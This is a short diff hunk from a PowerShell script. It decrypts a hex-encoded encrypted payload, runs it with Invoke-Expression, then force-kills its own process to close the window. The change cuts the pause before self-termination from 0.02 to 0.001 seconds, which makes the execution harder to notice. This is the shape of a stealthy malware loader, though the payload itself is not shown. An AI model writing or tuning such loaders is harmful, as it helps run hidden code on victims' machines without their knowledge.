@@ -44,5 +44,5 @@ $decryptedPayload = Decrypt-Payload $encryptedHex $keyHex
 Invoke-Expression $decryptedPayload
 
 # CLOSE PowerShell Window After Execution
-Start-Sleep -Seconds 0.02
+Start-Sleep -Seconds 0.001
 Stop-Process -Id $pid -Force
